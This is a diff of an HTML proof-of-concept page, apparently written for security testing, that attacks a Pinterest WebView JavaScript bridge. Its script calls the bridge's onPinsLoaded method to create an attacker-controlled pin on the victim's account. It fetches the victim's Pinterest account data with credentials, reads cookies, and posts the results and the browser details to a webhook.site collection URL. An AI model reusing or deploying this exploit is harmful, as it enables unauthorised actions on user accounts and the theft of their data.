@@ -2,56 +2,93 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>PT-M3 Test</title>
+<title>PT-M3 JSI Test</title>
 <style>
-body{font-family:monospace;font-size:14px;padding:20px;background:#fff;}
-#s{font-size:18px;font-weight:bold;margin-bottom:12px;}
-#d{white-space:pre-wrap;background:#f0f0f0;padding:10px;margin-top:10px;}
+body{font-family:monospace;font-size:13px;padding:16px;background:#fff;}
+#status{font-size:20px;font-weight:bold;padding:10px;margin-bottom:10px;border-radius:4px;}
+#log{white-space:pre-wrap;background:#f0f0f0;padding:10px;margin-top:10px;font-size:12px;}
 </style>
 </head>
 <body>
-<div id="s">Checking...</div>
-<img src="https://picsum.photos/id/10/640/480" width="320" height="240" alt="img1">
-<img src="https://picsum.photos/id/11/640/480" width="320" height="240" alt="img2">
-<pre id="d"></pre>
+<div id="status">Checking...</div>
+<img src="https://picsum.photos/id/10/640/480" width="320" height="240" alt="mountain1">
+<img src="https://picsum.photos/id/11/640/480" width="320" height="240" alt="mountain2">
+<div id="log"></div>
 <script>
-var WH="https://webhook.site/a4650d9c-8cfb-45cb-826c-02209dd79a8a";
-function log(m){document.getElementById("d").textContent+=m+"\n";}
-function cb(p,b){fetch(WH+"/"+p,{method:"POST",headers:{"Content-Type":"text/plain"},body:String(b)}).catch(function(){});}
+var WH = "https://webhook.site/a4650d9c-8cfb-45cb-826c-02209dd79a8a";
 
-log("[1] JS executed at: "+window.location.href);
-cb("js-ran","href="+window.location.href+"|UA="+navigator.userAgent);
-
-if(typeof window.JavaScriptInterface!=="undefined"){
-  document.body.style.background="red";
-  document.getElementById("s").textContent="EXPLOIT ACTIVE - JavaScriptInterface FOUND";
-  log("[2] JavaScriptInterface FOUND");
-  cb("jsi-found","present at "+window.location.href);
-  try{
-    window.JavaScriptInterface.onPinsLoaded(JSON.stringify({
-      thumb:[{url:"https://picsum.photos/id/20/640/480",x:0,y:0,width:640,height:480}],
-      meta:{url:"https://attacker-controlled.example.com",title:"PT-M3 ATTACKER PIN"}
-    }));
-    log("[3] onPinsLoaded() called");
-    cb("on-pins-loaded","success");
-  }catch(e){
-    log("[3] onPinsLoaded error: "+e);
-    cb("on-pins-loaded-error",String(e));
-  }
-}else{
-  document.body.style.background="yellow";
-  document.getElementById("s").textContent="JS ran - no JavaScriptInterface";
-  log("[2] JavaScriptInterface NOT found");
-  cb("jsi-missing","no JSI at "+window.location.href);
+function log(m) {
+  var d = document.getElementById("log");
+  d.textContent += m + "\n";
 }
 
-log("[4] Fetching api.pinterest.com with credentials...");
-fetch("https://api.pinterest.com/v3/me/",{credentials:"include",mode:"cors"})
-.then(function(r){log("[4] status: "+r.status);cb("api-status","HTTP "+r.status);return r.text();})
-.then(function(d){log("[4] data: "+d.substring(0,200));cb("api-data",d);})
-.catch(function(e){log("[4] fetch error: "+e);cb("cors-error",String(e));});
+function cb(path, body) {
+  fetch(WH + "/" + path, {
+    method: "POST",
+    headers: {"Content-Type": "text/plain"},
+    body: String(body)
+  }).catch(function() {});
+}
 
-log("[5] cookies this origin: ["+document.cookie+"]");
+log("[1] JS running at: " + window.location.href);
+log("[2] UA: " + navigator.userAgent);
+cb("js-ran", "href=" + window.location.href + "|UA=" + navigator.userAgent);
+
+if (typeof window.JavaScriptInterface !== "undefined") {
+  document.body.style.background = "#ff4444";
+  document.getElementById("status").style.background = "#ff4444";
+  document.getElementById("status").style.color = "#fff";
+  document.getElementById("status").textContent = "JSI FOUND - EXPLOIT ACTIVE";
+  log("[!] window.JavaScriptInterface IS PRESENT");
+  cb("jsi-found", "JSI present at " + window.location.href);
+
+  var pinPayload = JSON.stringify({
+    thumb: [{
+      url: "https://picsum.photos/id/20/640/480",
+      x: 0, y: 0, width: 640, height: 480
+    }],
+    meta: {
+      url: "https://attacker-controlled.example.com",
+      title: "PT-M3 ATTACKER PIN - AUTO CREATED"
+    }
+  });
+
+  log("[3] Calling window.JavaScriptInterface.onPinsLoaded()...");
+  try {
+    window.JavaScriptInterface.onPinsLoaded(pinPayload);
+    log("[+] onPinsLoaded() CALLED - pin creation triggered on victim account");
+    cb("on-pins-loaded-success", "payload=" + pinPayload);
+  } catch (e) {
+    log("[-] onPinsLoaded() error: " + e);
+    cb("on-pins-loaded-error", String(e));
+  }
+
+} else {
+  document.body.style.background = "#ffffa0";
+  document.getElementById("status").style.background = "#ffffa0";
+  document.getElementById("status").textContent = "JSI NOT FOUND (no pin closeup path)";
+  log("[-] window.JavaScriptInterface is NOT present");
+  log("    -> Open this URL from a pin closeup 'Visit website' button to get JSI");
+  cb("jsi-missing", "no JSI at " + window.location.href);
+}
+
+log("[4] Testing api.pinterest.com with credentials...");
+fetch("https://api.pinterest.com/v3/me/", {credentials: "include", mode: "cors"})
+  .then(function(r) {
+    log("[4] api.pinterest.com response status: " + r.status);
+    cb("api-status", "HTTP " + r.status);
+    return r.text();
+  })
+  .then(function(d) {
+    log("[4] api data (" + d.length + " bytes): " + d.substring(0, 200));
+    cb("api-data", d);
+  })
+  .catch(function(e) {
+    log("[4] fetch error (expected CORS block): " + e);
+    cb("cors-error", String(e));
+  });
+
+log("[5] document.cookie on this origin: [" + document.cookie + "]");
 </script>
 </body>
 </html>
